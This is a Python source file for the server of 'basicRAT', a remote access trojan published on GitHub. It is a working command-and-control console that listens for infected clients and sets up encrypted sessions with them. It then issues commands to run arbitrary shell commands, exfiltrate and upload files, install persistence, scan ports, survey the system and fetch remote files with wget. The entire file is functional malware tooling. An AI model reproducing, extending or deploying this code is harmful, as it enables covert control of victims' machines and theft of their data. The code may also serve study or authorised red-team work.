#!/usr/bin/env python
# -*- coding: utf-8 -*-

#
# basicRAT server
# https://github.com/vesche/basicRAT
#

import argparse
import readline
import socket
import struct
import sys
import threading
import time

from core import common
from core import crypto
from core import filesock


# ascii banner (Crawford2) - http://patorjk.com/software/taag/
# ascii rat art credit - http://www.ascii-art.de/ascii/pqr/rat.txt
BANNER = '''
 ____    ____  _____ ____   __  ____    ____  ______      .  ,
|    \  /    |/ ___/|    | /  ]|    \  /    ||      |    (\;/)
|  o  )|  o  (   \_  |  | /  / |  D  )|  o  ||      |   oo   \//,        _
|     ||     |\__  | |  |/  /  |    / |     ||_|  |_| ,/_;~      \,     / '
|  O  ||  _  |/  \ | |  /   \_ |    \ |  _  |  |  |   "'    (  (   \    !
|     ||  |  |\    | |  \     ||  .  \|  |  |  |  |         //  \   |__.'
|_____||__|__| \___||____\____||__|\_||__|__|  |__|       '~  '~----''
         https://github.com/vesche/basicRAT
'''
HELP_TEXT = '''
client <id>         - Connect to a client.
clients             - List connected clients.
download <files>    - Download file(s).
execute <command>   - Execute a command on the target.
help                - Show this help menu.
kill                - Kill the client connection.
persistence         - Apply persistence mechanism.
quit                - Exit the server and end all client connections.
rekey               - Regenerate crypto key.
scan <ip>           - Scan top 25 ports on a single host.
survey              - Run a system survey.
unzip <file>        - Unzip a file.
upload <files>      - Upload files(s).
wget <url>          - Download a file from the web.'''
COMMANDS = [ 'client', 'clients', 'download', 'execute', 'help', 'kill',
             'persistence', 'quit', 'rekey', 'scan', 'survey', 'unzip',
             'upload', 'wget' ]


class Server(threading.Thread):
    clients      = []
    alive        = True
    client_count = 1
    
    def __init__(self, port):
        super(Server, self).__init__()
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind(('0.0.0.0', port))
        self.s.listen(5)
    
    def run(self):
        while True:
            conn, addr = self.s.accept()
            client = ClientConnection(conn, addr)
            client_id = self.client_count
            self.clients.append({'client_id': client_id, 'client': client})
            self.client_count += 1
    
    def verify_client_id(self, client_id):
        try:
            client_index = next(i for (i, d) in enumerate(self.clients) if \
                           d['client_id'] == int(client_id))
            return True, 'Client {} selected.'.format(client_id)
        except (StopIteration, ValueError):
            return False, 'Error: Invalid client ID.'
    
    def select_client(self, client_id):
        try:
            for c in self.clients:
                if c['client_id'] == int(client_id):
                    return c['client']
        except (ValueError, IndexError):
            print 'Error: Invalid client ID.'
    
    def get_clients(self):
        return [c for c in self.clients if c['client'].alive]
    
    def remove_client(self, conn):
        conn_to_remove = next(i for i in self.clients if i['client'] == conn)
        self.clients.remove(conn_to_remove)


class ClientConnection(threading.Thread):
    alive = True
    
    def __init__(self, conn, addr):
        super(ClientConnection, self).__init__()
        self.conn   = conn
        self.addr   = addr
        self.dh_key = crypto.diffiehellman(self.conn, server=True)
        self.GCM    = crypto.AES_GCM(self.dh_key)
        self.IV     = 0
        self.conn.setblocking(0)
        self.start()
    
    def send(self, prompt, cmd, action):
        if not self.alive:
            print 'Error: Client not connected.'
            return
        
        # send prompt to client
        # self.conn.send(crypto.AES_encrypt(prompt, self.dh_key))
        crypto.sendGCM(self.conn, self.GCM, self.IV, prompt)
        self.conn.settimeout(1)
        self.IV += 1
        
        # kill client connection
        if cmd == 'kill':
            self.conn.close()
        
        # download a file
        elif cmd == 'download':
            for fname in action.split():
                fname = fname.strip()
                filesock.recvfile(self.conn, self.GCM, fname)

        # send file
        elif cmd == 'upload':
            for fname in action.split():
                fname = fname.strip()
                filesock.sendfile(self.conn, self.GCM, self.IV, fname)

        # regenerate DH key
        elif cmd == 'rekey':
            self.dh_key = crypto.diffiehellman(self.conn, server=True)

        # results of survey, persistence, unzip, or wget
        elif cmd in ['execute', 'scan', 'survey', 'persistence', 'unzip', 'wget']:
            print 'Running {}...'.format(cmd)
            recv_data = crypto.recvGCM(self.conn, self.GCM).rstrip()
            print recv_data
            #recv_data = self.conn.recv(1024)
            #print crypto.AES_decrypt(recv_data, self.dh_key)


def get_parser():
    parser = argparse.ArgumentParser(description='basicRAT server')
    parser.add_argument('-p', '--port', help='Port to listen on.',
                        default=1337, type=int)
    return parser


def main():
    parser  = get_parser()
    args    = vars(parser.parse_args())
    port    = args['port']
    
    curr_client_id  = '?'

    # print banner all sexy like
    for line in BANNER.split('\n'):
        time.sleep(0.05)
        print line

    # start server
    server = Server(port)
    server.setDaemon(True)
    server.start()
    print 'basicRAT server listening for connections on port {}.'.format(port)

    while True:
        prompt = raw_input('\n[{}] basicRAT> '.format(curr_client_id)).rstrip()

        # allow noop
        if not prompt:
            continue

        # seperate prompt into command and action
        cmd, _, action = prompt.partition(' ')

        # ensure command is valid before sending
        if cmd not in COMMANDS:
            print 'Invalid command, type "help" to see a list of commands.'
            continue

        # display help text
        if cmd == 'help':
            print HELP_TEXT
            continue
        
        # stop the server
        elif cmd == 'quit':
            quit_option = raw_input('Exit the server and end all client ' \
                                    'connections (y/N)? ')
            if quit_option[0].lower() == 'y':
                # gracefull kill all clients here
                sys.exit(0)
            else:
                continue

        # select client
        elif cmd == 'client':
            success, message = server.verify_client_id(action)
            if success:
                curr_client_id = action
            print message
            continue
        
        # list clients
        elif cmd == 'clients':
            print 'ID - Client Address'
            for c in server.get_clients():
                print '{:>2} - {}'.format(c['client_id'], c['client'].addr[0])
            continue

        # require client id
        if curr_client_id == '?':
            print 'Error: Invalid client ID.'
            continue
        
        # get client object based on current client id
        client = server.select_client(curr_client_id)
        
        # send data to client
        try:
            client.send(prompt, cmd, action)
        except (socket.error, ValueError):
            print "Client {} disconnected.".format(curr_client_id)
            cmd = 'kill'
        
        # reset client id if client killed
        if cmd == 'kill':
            server.remove_client(client)
            curr_client_id = '?'


if __name__ == '__main__':
    main()
